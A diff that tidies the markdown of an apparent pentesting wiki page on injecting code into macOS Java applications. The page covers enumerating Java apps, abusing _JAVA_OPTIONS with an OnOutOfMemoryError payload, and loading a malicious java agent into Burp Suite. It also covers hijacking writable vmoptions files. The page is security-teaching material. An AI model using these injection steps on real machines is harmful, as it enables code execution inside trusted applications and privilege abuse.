@@ -1,6 +1,5 @@
 # macOS Java Applications Injection
 
-
 ## Enumeration
 
 Find Java applications installed in your system. It was noticed that Java apps in the **Info.plist** will contain some java parameters which contain the string **`java.`**, so you can search for that:
@@ -12,7 +11,7 @@ sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/n
 # Full search
 sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
-```
+
 ## \_JAVA_OPTIONS
 
 The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parameters in the execution of a java compiled app:
@@ -22,7 +21,7 @@ The env variable **`_JAVA_OPTIONS`** can be used to inject arbitrary java parame
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-```
+
 To execute it as a new process and not as a child of the current terminal you can use:
 
 ```objectivec
@@ -77,7 +76,7 @@ int main(int argc, const char * argv[]) {
     return 0;
 }
 ```
-```
+
 However, that will trigger an error on the executed app, another more stealth way is to create a java agent and use:
 
 ```bash
@@ -88,7 +87,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-```
+
 > [!CAUTION]
 > Creating the agent with a **different Java version** from the application can crash the execution of both the agent and the application
 
@@ -110,14 +109,14 @@ public class Agent {
   }
 }
 ```
-```
+
 To compile the agent run:
 
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-```
+
 With `manifest.txt`:
 
 ```
@@ -126,7 +125,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-```
+
 And then export the env variable and run the java application like:
 
 ```bash
@@ -137,7 +136,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-```
+
 ## vmoptions file
 
 This file support the specification of **Java params** when Java is executed. You could use some of the previous tricks to change the java params and **make the process execute arbitrary commands**.\
@@ -157,7 +156,7 @@ Some applications like Android Studio indicates in their **output where are they
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-```
+
 If they don't you can easily check for it with:
 
 ```bash
@@ -167,8 +166,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-```
+
 Note how interesting is that Android Studio in this example is trying to load the file **`/Applications/Android Studio.app.vmoptions`**, a place where any user from the **`admin` group has write access.**
-
-
 
